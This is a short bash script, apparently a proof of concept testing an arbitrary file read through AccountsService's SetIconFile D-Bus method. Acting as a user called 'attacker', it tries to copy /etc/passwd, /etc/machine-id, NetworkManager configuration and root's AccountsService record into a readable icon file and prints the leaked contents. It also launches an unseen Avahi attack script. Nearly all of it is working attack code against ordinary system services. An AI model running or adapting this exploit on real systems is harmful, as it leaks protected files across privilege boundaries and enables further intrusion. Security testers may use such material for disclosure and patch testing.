#!/bin/bash
# Test SetIconFile arbitrary file read
FILES="/etc/passwd /etc/hostname /etc/machine-id /etc/NetworkManager/NetworkManager.conf /var/lib/AccountsService/users/root"

for f in $FILES; do
    result=$(su - attacker -c "dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetIconFile string:$f 2>&1")
    if echo "$result" | grep -q "method return"; then
        echo "[LEAKED] $f"
        head -3 /var/lib/AccountsService/icons/attacker 2>/dev/null
        echo "---"
    else
        echo "[BLOCKED] $f"
    fi
done

echo ""
echo "=== Avahi malicious service test ==="
su - attacker -c "python3 /tmp/avahi_attack.py"
